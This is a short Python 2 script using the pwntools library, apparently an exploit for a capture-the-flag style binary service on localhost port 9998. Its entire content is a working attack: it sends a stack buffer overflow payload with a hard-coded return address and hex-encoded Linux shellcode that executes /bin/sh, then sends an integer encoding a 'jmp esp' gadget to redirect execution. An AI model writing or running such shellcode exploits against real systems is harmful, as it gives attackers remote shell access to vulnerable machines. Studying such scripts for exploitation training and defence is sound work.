#!/usr/bin/env python2

from pwn import *

def attacker(host="127.0.0.1", port=9998):
    io = remote(host, port)
    shellcode_hex = '6a68682f2f2f73682f62696e6a0b5889e331c999cd80'
    io.sendline("A"*0x2c + p32(0x0804a048) + shellcode_hex.decode("hex"))
    jmpesp = '\x90\x90\xff\xe4' # jmp esp = ff e4
    io.sendline(str(u32(jmpesp, sign=True)))
    return True

if __name__ == "__main__":
    print attacker()
